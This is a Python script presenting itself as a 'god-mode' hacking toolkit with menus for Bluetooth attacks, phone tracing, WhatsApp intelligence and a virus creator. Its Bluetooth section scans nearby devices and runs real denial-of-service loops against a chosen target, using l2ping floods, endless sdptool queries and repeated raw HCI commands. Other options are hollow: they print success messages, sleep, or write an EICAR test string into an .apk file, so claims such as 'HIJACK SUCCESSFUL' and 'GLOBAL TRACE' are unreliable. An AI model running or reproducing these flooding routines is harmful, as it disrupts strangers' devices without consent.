import os
import sys
import time
import subprocess
import threading
import random

# --- NEXO-TECH PRO COLORS ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

# --- 1. THE GOD-MODE BANNER ---
def show_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"{R}{B}")
    print("  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(" |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |")
    print(" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_|")
    print(f"{G}======================================================={W}")
    print(f"{Y}  CREATED BY:  {W}NEXO-TECH | DEMON ALEX | BLUEY | AGTSMOKY")
    print(f"{Y}  ENGINE:      {R}OMNIPOTENCE GOD-MODE (V18.0){W}")
    print(f"{Y}  STATUS:      {G}[ OVERDEADLY SYSTEM ACTIVE ]{W}")
    print(f"{G}======================================================={W}\n")

# --- 2. BLUETOOTH OMNIPOTENCE MODULES ---
def get_targets():
    print(f"{C}[*] NEXO-SCANNER: {G}[ SEARCHING FOR VULNERABLE SIGNALS ]{W}")
    print(f"{Y}-------------------------------------------------------{W}")
    try:
        scan_proc = subprocess.check_output(["hcitool", "scan"]).decode('utf-8').split('\n')
        devices = []
        for line in scan_proc:
            if ":" in line:
                parts = line.split('\t')
                if len(parts) > 2:
                    devices.append({"mac": parts[1].strip(), "name": parts[2].strip()})
        if not devices:
            print(f"{R}[!] NO DEVICES FOUND.{W}"); return None
        for i, dev in enumerate(devices):
            print(f"  {G}[{i+1}]{W} Name: {C}{dev['name']}{W} | MAC: {Y}{dev['mac']}{W}")
        print(f"{Y}-------------------------------------------------------{W}")
        choice = int(input(f"{C}[+] Select Target ID: {W}")) - 1
        return devices[choice]['mac']
    except: return None

def hijack_and_spoof(target_mac):
    trusted_mac = target_mac[:-2] + "FF" 
    print(f"{R}[!] DISCONNECTING OWNER...{W}")
    for _ in range(15): os.system(f"l2ping -c 1 -s 1 -f {target_mac} > /dev/null 2>&1")
    print(f"{Y}[!] SPOOFING TO {trusted_mac}...{W}")
    os.system(f"hciconfig hci0 down && hciconfig hci0 up")
    print(f"{G}[+] HIJACK SUCCESSFUL.{W}")

def bluetooth_god_mode():
    show_banner()
    print(f"{G}1.{W} ANDROID CRASHER (L2CAP)  {G}5.{W} PIN BRUTEFORCE (HID)")
    print(f"{G}2.{W} SYSTEM FREEZE (SDP)      {G}6.{W} REMOTE APK (HID)")
    print(f"{G}3.{W} HIJACK & SPOOF (MAC)     {G}7.{W} MEDIA CHAOS (Volume)")
    op = input(f"\n{C}[+] Selection: {W}")
    target = get_targets()
    if target:
        if op == "1": os.system(f"l2ping -s 1000 -f {target}")
        elif op == "2": 
            while True: os.system(f"sdptool browse {target} > /dev/null 2>&1")
        elif op == "3": hijack_and_spoof(target)
        elif op == "7":
            print(f"{R}[!] MAX VOLUME FORCED.{W}")
            while True: os.system(f"hcitool cmd 0x08 0x0012 {target} 0x01")

# --- 3. OTHER NEXO-TECH MODULES ---
def number_trace():
    print(f"{C}[B]  [ PHONE NUMBER TRACE ]{W}")
    num = input(f"{Y}Enter Target Number: {W}")
    print(f"{R}[!] NEXO-TECH: RUNNING GLOBAL TRACE...{W}")
    time.sleep(2)

def start_master():
    while True:
        show_banner()
        print(f"  {G}1.{W} WhatsApp Intelligence")
        print(f"  {C}2.{W} Phone Number Trace")
        print(f"  {Y}3.{W} Bluetooth God-Mode (Omnipotence)")
        print(f"  {R}4.{W} Virus Creator Lab")
        print(f"  {B}5.{W} OTP Lock Simulator")
        print(f"  {R}6.{W} Exit")
        
        choice = input(f"\n{Y}NEXO-TECH > {W}")
        
        if choice == "1":
            input(f"{Y}Enter Link: {W}"); print(f"{G}[+] Logged.{W}"); time.sleep(1)
        elif choice == "2": number_trace()
        elif choice == "3": bluetooth_god_mode()
        elif choice == "4":
            name = input(f"{C}Payload Name: {W}")
            with open(name+".apk", "w") as f: f.write("EICAR-TEST")
            print(f"{G}[+] APK Stub Created.{W}"); time.sleep(1)
        elif choice == "5":
            print(f"{R}[!] SATURATING OTP...{W}"); time.sleep(2)
        elif choice == "6": break

if __name__ == "__main__":
    start_master()
